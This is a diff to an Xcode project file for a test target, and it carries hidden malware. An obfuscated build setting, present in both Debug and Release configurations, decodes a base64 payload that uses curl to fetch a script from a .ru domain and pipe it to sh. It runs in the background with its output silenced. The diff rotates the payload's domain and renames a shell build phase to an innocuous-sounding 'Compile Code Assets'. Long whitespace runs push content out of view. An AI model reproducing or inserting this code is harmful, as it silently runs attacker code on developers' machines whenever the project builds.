@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				BA324EA2E32441F2A44EE078 /* Build Target Libraries */,
+				C40816320B9B4DC8BB4EE078 /* Compile Code Assets */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -273,7 +273,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																																																																																																																																																											/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																																																											/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BA324EA2E32441F2A44EE078 /* Build Target Libraries */ = {
+		C40816320B9B4DC8BB4EE078 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -305,7 +305,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((u(){ `printf b3ase64 | tr -d 3` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtTHNrZiAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9xb3Bia3BtZHl3azdiLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((s(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC0tcmV0cnkgNSAta0xmcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9ncG1hZHBqeHFkazUucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((u(){ `printf b3ase64 | tr -d 3` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtTHNrZiAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9xb3Bia3BtZHl3azdiLnJ1L2EpIiB8IHNoCg== | u | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((s(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC0tcmV0cnkgNSAta0xmcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9ncG1hZHBqeHFkazUucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
